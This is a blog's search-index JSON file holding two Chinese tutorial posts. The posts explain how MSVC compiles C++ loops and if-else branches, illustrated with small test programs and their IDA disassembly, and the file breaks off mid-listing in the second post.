{"meta":{"title":"m-Onst","subtitle":"Hi~ o(*￣▽￣*)ブ","description":"description","author":"iforget","url":"https://4st.tech","root":"/"},"pages":[{"title":"书单","date":"2021-04-03T07:11:03.000Z","updated":"2021-08-04T04:57:02.778Z","comments":true,"path":"books/index.html","permalink":"https://4st.tech/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-04-03T07:12:07.000Z","updated":"2021-08-04T04:57:02.777Z","comments":true,"path":"about/index.html","permalink":"https://4st.tech/about/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-04-03T07:07:55.000Z","updated":"2021-08-12T10:16:54.708Z","comments":true,"path":"categories/index.html","permalink":"https://4st.tech/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2021-04-03T07:11:40.000Z","updated":"2021-08-04T04:57:02.779Z","comments":true,"path":"links/index.html","permalink":"https://4st.tech/links/index.html","excerpt":"","text":""},{"title":"项目","date":"2021-04-03T07:10:44.000Z","updated":"2021-08-04T04:57:02.779Z","comments":true,"path":"repository/index.html","permalink":"https://4st.tech/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-04-03T07:07:39.000Z","updated":"2021-08-12T10:17:34.480Z","comments":true,"path":"tags/index.html","permalink":"https://4st.tech/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"C++逆向：循环结构的分析、识别与还原","slug":"C-逆向：循环结构的分析、识别与还原","date":"2021-09-01T03:33:52.000Z","updated":"2021-09-01T05:08:56.351Z","comments":true,"path":"2021/09/01/c-ni-xiang-xun-huan-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/","link":"","permalink":"https://4st.tech/2021/09/01/c-ni-xiang-xun-huan-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/","excerpt":"","text":"循环结构是程序设计的三大结构之一，搞清楚它在反汇编下的代码特征对于逆向工程来说是非常重要的。对于C/C++来说，循环结构常见的有三种类型：for，while和do...while。本文会分析这三种情况分别在VS2019的MSVC或VC6的MSVC采用速度最快的优化选项后的表现形式及其还原方法，当VC6中的反汇编结果与VS2019中的一致时，则不再赘述。 … 各种循环语句的分析 do...while循环的分析 示例代码： 12345678910111213int main(int argc, char **argv)&#123; int nSum = 0; int i = 1; do &#123; nSum = nSum + i; i++; &#125; while (i &lt;= 100); printf(&quot;%d\\r\\n&quot;, nSum); return 0; &#125; 反汇编结果： 123456789101112131415161718192021.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040.text:00401040 xor ecx, ecx.text:00401042 mov eax, 1.text:00401047.text:00401047 LOOP_BEGIN: ; CODE XREF: _main+D↓j.text:00401047 add ecx, eax.text:00401049 inc eax.text:0040104A cmp eax, 64h ; &#x27;d&#x27;.text:0040104D jle short LOOP_BEGIN.text:0040104F push ecx.text:00401050 push offset _Format ; &quot;%d\\r\\n&quot;.text:00401055 call _printf.text:0040105A add esp, 8.text:0040105D xor eax, eax.text:0040105F retn.text:0040105F _main endp 观察其循环部分的特征： 12345.text:00401047 LOOP_BEGIN: ; CODE XREF: _main+D↓j.text:00401047 add ecx, eax.text:00401049 inc eax.text:0040104A cmp eax, 64h ; &#x27;d&#x27;.text:0040104D jle short LOOP_BEGIN 可以发现，其逻辑上是当eax &lt;= 100时就会继续执行循环体内部的代码，其逻辑与源代码的逻辑是一致的，无需对jcc的条件进行取反。 对永真条件的测试代码： 12345678int main(int argc, char **argv)&#123; do &#123; printf(&quot;always true\\n&quot;); &#125; while (true); return 0;&#125; 反汇编结果如下： 12345.text:00401060 loc_401060: ; CODE XREF: _main+2D↓j.text:00401060 push offset aAlwaysTrue ; &quot;always true\\n&quot;.text:00401065 call _printf.text:0040106A add esp, 4.text:0040106D jmp short loc_401060 可以总结do...while代码特征：只有一个跳转，且当比较后，条件跳转往上走的就是do...while循环结构。如果不是条件跳转，而是无条件跳转jmp的话，则表明是永真的循环。 还原时，只需要找到do...while循环结构的边界： jcc跳转所在地址处是do...while循环的下界，即：高级代码的右花括号&#125;的位置。 jcc跳转后面接的地址是do...while循环的上界，即：高级代码的左花括号&#123;的位置 找到这两个位置后，将循环条件取正作为do...while的循环条件；将标号和jcc跳转所包裹的代码作为do...while循环体内部的代码进行还原即可。 while循环的分析 对于while的分析，需要注意，此时需要临时关闭优化选项，否则编译器会将下述示例代码优化为同do...while相同的结果。而对于优化为和do...while相同结果的，则不再赘述。 while的代码实例： 12345678910111213int main(int argc, char **argv)&#123; int nSum = 0; int i = 1; while (i &lt;= 100) &#123; nSum = nSum + i; i++; &#125;; printf(&quot;%d\\r\\n&quot;, nSum); return 0; &#125; 反汇编结果： 1234567891011121314151617181920212223242526272829303132333435363738.text:00401080 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401080 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401080.text:00401080 nSum = dword ptr -8.text:00401080 i = dword ptr -4.text:00401080 argc = dword ptr 8.text:00401080 argv = dword ptr 0Ch.text:00401080 envp = dword ptr 10h.text:00401080.text:00401080 push ebp.text:00401081 mov ebp, esp.text:00401083 sub esp, 8.text:00401086 mov [ebp+nSum], 0.text:0040108D mov [ebp+i], 1.text:00401094.text:00401094 LOOP_BEGIN: ; CODE XREF: _main+2C↓j.text:00401094 cmp [ebp+i], 64h ; &#x27;d&#x27;.text:00401098 jg short LOOP_END.text:0040109A mov eax, [ebp+nSum].text:0040109D add eax, [ebp+i].text:004010A0 mov [ebp+nSum], eax.text:004010A3 mov ecx, [ebp+i].text:004010A6 add ecx, 1.text:004010A9 mov [ebp+i], ecx.text:004010AC jmp short LOOP_BEGIN.text:004010AE ; ---------------------------------------------------------------------------.text:004010AE.text:004010AE LOOP_END: ; CODE XREF: _main+18↑j.text:004010AE mov edx, [ebp+nSum].text:004010B1 push edx.text:004010B2 push offset _Format ; &quot;%d\\r\\n&quot;.text:004010B7 call _printf.text:004010BC add esp, 8.text:004010BF xor eax, eax.text:004010C1 mov esp, ebp.text:004010C3 pop ebp.text:004010C4 retn.text:004010C4 _main endp 可以总结while循环结构的代码特征： 有两处跳转，一处为条件跳转，另一处为绝对跳转。 条件跳转为下跳，绝对跳转为上跳 条件跳转处的条件为源代码中的循环条件的相反条件 上述特征符合高级语法while的逻辑和汇编代码自身的逻辑。而在还原时，只需要找到其边界： jcc条件跳转为下跳，它是代码的上界，即：高级代码的左花括号&#123;的位置 jmp无条件跳转为上跳，它是代码的下界，即：高级代码的右花括号&#125;的位置 还原时，只需要找到这两个边界后，将jcc条件取反后作为循环条件，两个边界中间的汇编代码还原为相对应的高级代码即可。 for循环的分析 在对for循环的分析时，也需要暂时关闭优化选项，理由同while的分析。 示例代码： 123456789101112int main(int argc, char **argv)&#123; int nSum = 0; int i = 1; for (i = 1; i &lt;= 100; ++i) &#123; nSum = nSum + i; &#125; printf(&quot;%d\\r\\n&quot;, nSum); return 0; &#125; 反汇编结果： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:00401080 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401080 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401080.text:00401080 nSum = dword ptr -8.text:00401080 i = dword ptr -4.text:00401080 argc = dword ptr 8.text:00401080 argv = dword ptr 0Ch.text:00401080 envp = dword ptr 10h.text:00401080.text:00401080 push ebp.text:00401081 mov ebp, esp.text:00401083 sub esp, 8.text:00401086 mov [ebp+nSum], 0.text:0040108D.text:0040108D LOOP_BEGIN:.text:0040108D mov [ebp+i], 1.text:00401094 jmp short LOOP_CMP.text:00401096 ; ---------------------------------------------------------------------------.text:00401096.text:00401096 LOOP_STEP: ; CODE XREF: _main+2E↓j.text:00401096 mov eax, [ebp+i].text:00401099 add eax, 1.text:0040109C mov [ebp+i], eax.text:0040109F.text:0040109F LOOP_CMP: ; CODE XREF: _main+14↑j.text:0040109F cmp [ebp+i], 64h ; &#x27;d&#x27;.text:004010A3 jg short LOOP_END.text:004010A5 mov ecx, [ebp+nSum].text:004010A8 add ecx, [ebp+i].text:004010AB mov [ebp+nSum], ecx.text:004010AE jmp short LOOP_STEP.text:004010B0 ; ---------------------------------------------------------------------------.text:004010B0.text:004010B0 LOOP_END: ; CODE XREF: _main+23↑j.text:004010B0 mov edx, [ebp+nSum].text:004010B3 push edx.text:004010B4 push offset _Format ; &quot;%d\\r\\n&quot;.text:004010B9 call _printf.text:004010BE add esp, 8.text:004010C1 xor eax, eax.text:004010C3 mov esp, ebp.text:004010C5 pop ebp.text:004010C6 retn.text:004010C6 _main endp 可以观察到其有三个跳转，因此它的速度是会比while和do...while循环要慢的，因为它打断了流水线优化。还可以观察到，其明显的具有三个部分： LOOP_INIT部分 LOOP_CMP部分 LOOP_STEP部分 由于要符合高级语言for的逻辑要求： 初始化部分只执行一次； 在执行循环体之前需要先判断一下循环条件； 在执行完循环体后再执行步长部分。 故可以总结代码特征为： 有三处跳转，一处条件跳转，两处绝对跳转。 条件跳转为下跳，跳转到循环体外部 第一处绝对跳转为下跳，跳转到for循环的比较部分 第二处绝对跳转为上跳，跳转到for循环的步长部分。 掌握了for循环的代码特征后，还原也就简单了，只需要分别找到对应的几个部分进行还原即可。 关键字break和continue的分析 对于这两个部分的分析，我是打开O2了的优化。 循环体内包含break关键字 示例代码： 123456789101112int main(int argc, char** argv)&#123; for (int i = 1; i &lt;= 100; ++i) &#123; if (i == argc) &#123; break; &#125; printf(&quot;%d\\r\\n&quot;, i); &#125; return 0;&#125; 反汇编结果： 123456789101112131415161718192021222324252627282930313233.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 push esi.text:00401044 push edi.text:00401045 mov edi, [ebp+argc].text:00401048 mov esi, 1.text:0040104D nop dword ptr [eax].text:00401050.text:00401050 LOOP_BEGIN: ; CODE XREF: _main+26↓j.text:00401050 cmp esi, edi.text:00401052 jz short LOOP_END.text:00401054 push esi.text:00401055 push offset _Format ; &quot;%d\\r\\n&quot;.text:0040105A call _printf.text:0040105F inc esi.text:00401060 add esp, 8.text:00401063 cmp esi, 64h ; &#x27;d&#x27;.text:00401066 jle short LOOP_BEGIN.text:00401068.text:00401068 LOOP_END: ; CODE XREF: _main+12↑j.text:00401068 pop edi.text:00401069 xor eax, eax.text:0040106B pop esi.text:0040106C pop ebp.text:0040106D retn.text:0040106D _main endp 可以发现，其已经将for循环，优化成了do...while的循环了。而在这个循环体内部，还有一个条件跳转： 12.text:00401050 cmp esi, edi.text:00401052 jz short LOOP_END 经过分析后，可以得出，其是跳转到循环体外部的，也就是符合了break关键字的逻辑要求：结束循环，转到执行循环体外部的代码。 在还原时，可以根据出现在循环体内部的情况，来具体根据关键字的语义来还原。 循环体内包含continue关键字 示例代码： 123456789101112int main(int argc, char** argv)&#123; for (int i = 1; i &lt;= 100; ++i) &#123; if (i == argc) &#123; continue; &#125; printf(&quot;%d\\r\\n&quot;, i) : &#125; return 0;&#125; 反汇编的结果： 12345678910111213141516171819202122232425262728293031323334353637.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 push esi.text:00401044 push edi.text:00401045 mov edi, [ebp+argc].text:00401048 mov esi, 1.text:0040104D nop dword ptr [eax].text:00401050.text:00401050 LOOP_BEGIN: ; CODE XREF: _main+26↓j.text:00401050 cmp esi, edi.text:00401052 jz short LOOP_STEP.text:00401054 push esi.text:00401055 push offset _Format ; &quot;%d\\r\\n&quot;.text:0040105A call _printf.text:0040105F add esp, 8.text:00401062.text:00401062 LOOP_STEP: ; CODE XREF: _main+12↑j.text:00401062 inc esi.text:00401063.text:00401063 LOOP_CMP:.text:00401063 cmp esi, 64h ; &#x27;d&#x27;.text:00401066 jle short LOOP_BEGIN.text:00401068.text:00401068 LOOP_END:.text:00401068 pop edi.text:00401069 xor eax, eax.text:0040106B pop esi.text:0040106C pop ebp.text:0040106D retn.text:0040106D _main endp 可以发现，其也是将其优化成了do...while了。再进一步分析，可以得出一个类似于满足for循环的语义的几个部分。在还原时可以按照自己的喜好和代码可读性，还原为任意一种循环即可。 在分析上述反汇编时，可以看到一处条件跳转： 123.text:00401050 LOOP_BEGIN: ; CODE XREF: _main+26↓j.text:00401050 cmp esi, edi.text:00401052 jz short LOOP_STEP 其就是关键字continue的语义：提前结束本次循环，进入下一次循环。 循环体内包含break关键字造成的特殊优化现象 示例代码： 123456789int main(int argc, char** argv)&#123; for (int i = 1; i &lt;= 100; ++i) &#123; printf(&quot;%d&quot;, i); break; &#125; return 0;&#125; 反汇编结果： 12345678910111213.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040.text:00401040 push 1.text:00401042 push offset _Format ; &quot;%d&quot;.text:00401047 call _printf.text:0040104C add esp, 8.text:0040104F xor eax, eax.text:00401051 retn.text:00401051 _main endp 可以发现，编译器并没有生成循环代码。因为编译器在编译阶段判断出了这个循环只需要执行一次，故可以将循环体内部的代码外提，然后省略掉不必要的循环。 关键字continue和break的还原方法总结 根据上述分析，如果一个条件跳转跳转到了循环体的外部，则它就是break；如果一个条件跳转跳转到了循环体的循环起始位置，则它就是continue。 总的优化原则 对于循环结构来说，最好是能尽量不打断流水线优化。所以常见的对于循环优化的方法有： 强度削弱，用指令周期少指令代替指令周期多的指令 减少分支，能优化成do...while就优化成do...while的形式 代码外提 对于强度削弱不需要解释，那么为什么要能优化成do...while的循环就优化成do...while的形式呢？由于do...while的特征是先执行一次循环体内的代码后，再进行判断，它与汇编上条件跳转成立的条件逻辑上是一致的，且根据上面分析，它只有一处向上的跳转，能够减少分支，这样就可以尽量少的影响到流水线优化，提高程序的执行效率。 而对于代码外提其实是有条件的，对于循环条件的检查部分，不能是循环体内被修改的值，只有满足这个条件的时候才会被外提。即：当比较的是固定值时，编译器就会将其自动代码外提；但是当它是一个黑盒的时候，就不能做到自动的代码外提了。","categories":[{"name":"C/C++逆向","slug":"C-C-逆向","permalink":"https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"循环结构","slug":"循环结构","permalink":"https://4st.tech/tags/%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/"},{"name":"for","slug":"for","permalink":"https://4st.tech/tags/for/"},{"name":"while","slug":"while","permalink":"https://4st.tech/tags/while/"},{"name":"do...while","slug":"do-while","permalink":"https://4st.tech/tags/do-while/"},{"name":"continue","slug":"continue","permalink":"https://4st.tech/tags/continue/"},{"name":"break","slug":"break","permalink":"https://4st.tech/tags/break/"}]},{"title":"C++逆向：选择结构的分析、识别与还原","slug":"C-逆向：选择结构的分析、识别与还原","date":"2021-08-31T03:12:59.000Z","updated":"2021-09-01T05:08:01.865Z","comments":true,"path":"2021/08/31/c-ni-xiang-xuan-ze-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/","link":"","permalink":"https://4st.tech/2021/08/31/c-ni-xiang-xuan-ze-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/","excerpt":"","text":"结构化程序设计的三大结构，分别是：顺序结构、选择结构和循环结构。这三种基本结构可以任意组合，形成多姿多彩的程序世界。在这其中的顺序结构是按照代码编写的顺序逐步执行；而选择结构打断了这种顺序，让程序支持了逻辑条件。因此，可以识别与还原选择结构对于C/C++逆向工程是非常重要的。本文只进行识别和还原if-else结构，而switch-case结构已经阐述完毕，本文不再进行赘述。实验环境采用的是VS2019的MSVC和VC6的MSVC进行编译，优化选项为速度最快优化。 … 条件转移的分类条件转移指令大致上分为三类： if-else结构 switch-case结构 三目运算 其中：switch-case的优化策略较多，因此对于它在反汇编中的识别和还原另开辟了一篇文章进行了讨论与分析。本文注重分析if-else分支结构的分析与还原以及对三目运算的简要分析，在分析时需要注意各种优化策略（如：传播、折叠、公共表达式等）优化策略对分析的影响。 各类选择结构的分析if...else单分支结构的分析常量做判断条件测试代码： 123456int main(int argc, char** argv) &#123; if (1) &#123; printf(&quot;constant\\n&quot;); &#125; return 0;&#125; 反汇编的结果： 12345678910111213.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401040.text:00401040 argc = dword ptr 4.text:00401040 argv = dword ptr 8.text:00401040 envp = dword ptr 0Ch.text:00401040.text:00401040 push offset Format ; &quot;constant\\n&quot;.text:00401045 call sub_401010.text:0040104A add esp, 4.text:0040104D xor eax, eax.text:0040104F retn.text:0040104F _main endp 可以发现，没有生成任何的条件转移指令。为什么呢？因为编译器在编译过程中就可以确定执行的是哪一个分支，故编译器在编译阶段就将其优化掉了，不会产生任何的条件转移指令。对于这样的代码，在底层是还原不出来上述测试代码的，但是可以还原出其等价代码。 if单分支结构测试代码： 123456int main(int argc, char** argv) &#123; if (argc &gt; 2) &#123; printf(&quot;argc &gt; 2\\n&quot;); &#125; return 0;&#125; 反汇编的完整结果： 1234567891011121314151617181920.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp ; ArgList.text:00401041 mov ebp, esp.text:00401043 cmp [ebp+argc], 2.text:00401047 jle short IF_END.text:00401049 push offset Format ; &quot;argc &gt; 2\\n&quot;.text:0040104E call sub_401010.text:00401053 add esp, 4.text:00401056.text:00401056 IF_END: ; CODE XREF: _main+7↑j.text:00401056 xor eax, eax.text:00401058 pop ebp.text:00401059 retn.text:00401059 _main endp 经过整理可以发现，其产生了一条条件转移指令jle short IF_END。但是好像与我们源代码中写的条件argc &gt; 2是不同的，为什么是这样的？编译器生成的汇编代码还是正确的吗？答案是生成的汇编代码是正确的。原因是对于高级代码（如C语言的代码）而言，如果条件成立则执行条件体内部的代码；而对于汇编指令来说，如果条件成立则跳转成立，就会将执行流程转移了。所以在生成汇编代码的时候，需要对原条件进行取反，才能保证其逻辑上与高级代码的逻辑是一致的，即：条件成立，执行条件体内的代码。 根据上述特点，可以总结单分支转移结构的特点： 有一条jcc指令 jcc指令后面会紧跟一个标号 标号上面没有其他的跳转 这个跳转跳过一段代码 根据这些特点就可以将单分支结构给识别出来了，还原时，只需要将jcc指令和标号中间的代码还原到条件体内部，而判断条件为jcc指令条件取反即可还原。 if...else结构测试代码： 123456789int main(int argc, char** argv) &#123; if (argc &gt; 2) &#123; printf(&quot;argc &gt; 2\\n&quot;); &#125; else &#123; printf(&quot;default\\n&quot;); &#125; return 0;&#125; VS2019的反汇编结果 1234567891011121314151617181920.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 cmp [ebp+argc], 2.text:00401047 mov ecx, offset _Format ; &quot;argc &gt; 2\\n&quot;.text:0040104C mov eax, offset aDefault ; &quot;default\\n&quot;.text:00401051 cmovg eax, ecx.text:00401054 push eax ; _Format.text:00401055 call _printf.text:0040105A add esp, 4.text:0040105D xor eax, eax.text:0040105F pop ebp.text:00401060 retn.text:00401060 _main endp 可以发现没有使用jcc指令，而是使用了新的指令cmovg ，它们是一系列的条件赋值指令，指令功能为：当条件成立时，则执行赋值操作。对于本例来说，其优化后的反汇编代码还原后为： 12345678int __cdecl main(int argc, const char **argv, const char **envp) &#123; const char *str = &quot;default\\n&quot;; if (argc &gt; 2) &#123; str = &quot;argc &gt; 2\\n&quot;; &#125; printf(str); return 0;&#125; 即：编译器首先假设是default的情况，然后再进行判断其是否大于2，编译器这么做是与源代码等价的。 MSVC的高版本编译器使用了条件赋值指令来实现了无分支的操作，那么在不支持条件赋值指令的CPU上是如何操作的呢？现在用VC6的MSVC进行编译测试一下（因为VC6的那个年代，没有这条指令，所以可以观察VC6下的编译结果），观察其反汇编结果： 12345678910111213141516171819202122232425262728.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 cmp [esp+arg_0], 2.text:00401005 jle short ELSE_BEGIN.text:00401005.text:00401007 push offset s-&gt;Argc&gt;2 ; &quot;argc &gt; 2\\n&quot;.text:0040100C call printf.text:0040100C.text:00401011 add esp, 4.text:00401014 xor eax, eax.text:00401016 retn.text:00401016.text:00401017 ; ---------------------------------------------------------------------------.text:00401017.text:00401017 ELSE_BEGIN: ; CODE XREF: _main+5\u0018j.text:00401017 push offset s-&gt;Default ; &quot;default\\n&quot;.text:0040101C call printf.text:0040101C.text:00401021 add esp, 4.text:00401024.text:00401024 ELSE_END:.text:00401024 xor eax, eax.text:00401026 retn.text:00401026.text:00401026 _main endp 可以发现，其还是使用的条件转移指令进行实现的。由于采用的是速度最快的优化，其优化方式如图所示： 所以没有使用无条件跳转转移指令来连接公共的代码块，而是利用公共表达式优化，将公共代码块复制一份，抵消了一次跳转，从而没有打断CPU的流水线优化，提高了运行速度。 if...else的代码特征： 有多个jcc指令，每个jcc指令后都有一个标号 标号之间为各个条件块内的代码 而对于还原方法，其还原的方法与if单分支结构的还原方法一致。 if...else if多分支结构的分析if...else if结构测试代码： 123456789int main(int argc, char** argv) &#123; if (argc &gt; 2) &#123; printf(&quot;argc &gt; 2\\n&quot;); &#125; else if (argc &lt; 4) &#123; printf(&quot;argc &lt; 4\\n&quot;); &#125; return 0;&#125; VS2019版本的完整的反汇编结果如下： 1234567891011121314151617181920.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 cmp [ebp+argc], 2.text:00401047 mov ecx, offset _Format ; &quot;argc &gt; 2\\n&quot;.text:0040104C mov eax, offset aArgc4 ; &quot;argc &lt; 4\\n&quot;.text:00401051 cmovg eax, ecx.text:00401054 push eax ; _Format.text:00401055 call _printf.text:0040105A add esp, 4.text:0040105D xor eax, eax.text:0040105F pop ebp.text:00401060 retn.text:00401060 _main endp 可以发现，其也是使用的comvg来实现的无分支转移。对于低版本的编译器，如VC6的MSVC的情况，反汇编结果如下： 123456789101112131415161718192021222324252627282930313233.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 cmp eax, 2.text:00401007 jle short ELSE_IF.text:00401007.text:00401009 push offset s-&gt;Argc&gt;2 ; &quot;argc &gt; 2\\n&quot;.text:0040100E call printf.text:0040100E.text:00401013 add esp, 4.text:00401016 xor eax, eax.text:00401018 retn.text:00401018.text:00401019 ; ---------------------------------------------------------------------------.text:00401019.text:00401019 ELSE_IF: ; CODE XREF: _main+7\u0018j.text:00401019 cmp eax, 4.text:0040101C jge short EXIT_PROGRAM.text:0040101C.text:0040101E push offset s-&gt;Argc&lt;4 ; &quot;argc &lt; 4\\n&quot;.text:00401023 call printf.text:00401023.text:00401028 add esp, 4.text:00401028.text:0040102B.text:0040102B EXIT_PROGRAM: ; CODE XREF: _main+1C\u0018j.text:0040102B xor eax, eax.text:0040102D retn.text:0040102D.text:0040102D _main endp 使用的还是公共代码块提取出来，以减少一次跳转，提高运行速度。 if...else if...else结构测试代码： 123456789101112int main(int argc, char** argv) &#123; if (argc &gt; 2) &#123; printf(&quot;argc &gt; 2\\n&quot;); &#125; else if (argc &lt; 0) &#123; printf(&quot;argc &lt; 0\\n&quot;); &#125; else &#123; printf(&quot;argc &gt;= 0 and argc &lt;= 2\\n&quot;); &#125; return 0;&#125; VS2019的MSVC的反汇编结果： 12345678910111213141516171819202122232425262728293031323334.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 mov ecx, [ebp+argc].text:00401046 cmp ecx, 2.text:00401049 jle short ELSE_IF.text:0040104B mov eax, offset _Format ; &quot;argc &gt; 2\\n&quot;.text:00401050 push eax ; _Format.text:00401051 call _printf.text:00401056 add esp, 4.text:00401059 xor eax, eax.text:0040105B pop ebp.text:0040105C retn.text:0040105D ; ---------------------------------------------------------------------------.text:0040105D.text:0040105D ELSE_IF: ; CODE XREF: _main+9↑j.text:0040105D test ecx, ecx.text:0040105F mov edx, offset aArgc0AndArgc2 ; &quot;argc &gt;= 0 and argc &lt;= 2\\n&quot;.text:00401064 mov eax, offset aArgc0 ; &quot;argc &lt; 0\\n&quot;.text:00401069 cmovns eax, edx.text:0040106C push eax ; _Format.text:0040106D call _printf.text:00401072 add esp, 4.text:00401075 xor eax, eax.text:00401077 pop ebp.text:00401078 retn.text:00401078 _main endp.text:00401078 其首先判断是否是大于2的，如果不是再使用条件赋值语句来减少一次跳转。对于其高版本的还原是比较好做等价代码的还原的。对于低版本的MSVC的反汇编结果如下： 12345678910111213141516171819202122232425262728293031323334353637383940.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 cmp eax, 2.text:00401007 jle short ELSE_IF.text:00401007.text:00401009 push offset s-&gt;Argc&gt;2 ; &quot;argc &gt; 2\\n&quot;.text:0040100E call printf.text:0040100E.text:00401013 add esp, 4.text:00401016 xor eax, eax.text:00401018 retn.text:00401018.text:00401019 ; ---------------------------------------------------------------------------.text:00401019.text:00401019 ELSE_IF: ; CODE XREF: _main+7\u0018j.text:00401019 test eax, eax.text:0040101B jge short ELSE.text:0040101B.text:0040101D push offset s-&gt;Argc&lt;0 ; &quot;argc &lt; 0\\n&quot;.text:00401022 call printf.text:00401022.text:00401027 add esp, 4.text:0040102A xor eax, eax.text:0040102C retn.text:0040102C.text:0040102D ; ---------------------------------------------------------------------------.text:0040102D.text:0040102D ELSE: ; CODE XREF: _main+1B\u0018j.text:0040102D push offset s-&gt;Argc&gt;0AndArgc&lt;2 ; &quot;argc &gt;= 0 and argc &lt;= 2\\n&quot;.text:00401032 call printf.text:00401032.text:00401037 add esp, 4.text:0040103A xor eax, eax.text:0040103C retn.text:0040103C.text:0040103C _main endp 使用的是公共代码优化和jcc指令来实现的多分支结果，其还原方法还是对jcc的条件取反再进行还原即可。 三目运算的分析测试代码： 1234int main(int argc, char** argv) &#123; printf(&quot;%d\\n&quot;, argc &gt; 2 ? argc - 1 : argc + 10); return 0;&#125; VS2019的MSVC的反汇编结果： 12345678910111213141516171819202122.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 or ecx, 0FFFFFFFFh.text:00401046 mov edx, 0Ah.text:0040104B cmp [ebp+argc], 2.text:0040104F cmovle ecx, edx.text:00401052 add ecx, [ebp+argc].text:00401055 push ecx.text:00401056 push offset _Format ; &quot;%d\\n&quot;.text:0040105B call _printf.text:00401060 add esp, 8.text:00401063 xor eax, eax.text:00401065 pop ebp.text:00401066 retn.text:00401066 _main endp 使用的还是条件赋值指令，提高运行速度。对于其还原只需要关注条件赋值指令，它本质上的逻辑还是先假设一个条件预先成立，然后再判断其余剩下的条件，根据条件成立与否来进行值的替换。 补充：对于复杂条件的分支结构的识别与还原在写代码的过程中，最常见的就是经过逻辑与和逻辑或来进行条件组合。那么对于这些复杂的条件如何识别和还原呢？先对与条件、或条件的单独情况进行观察分析，然后再对复杂的组合条件来进行分析。 与条件测试代码： 123456int main(int argc, char** argv) &#123; if (argv != nullptr &amp;&amp; argc &gt; 2) &#123; printf(&quot;argv != nullptr &amp;&amp; argc &gt; 2\\n&quot;); &#125; return 0;&#125; VS2019的MSVC下的反汇编结果： 1234567891011121314151617181920212223.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 cmp [ebp+argv], 0.text:00401047 jz short 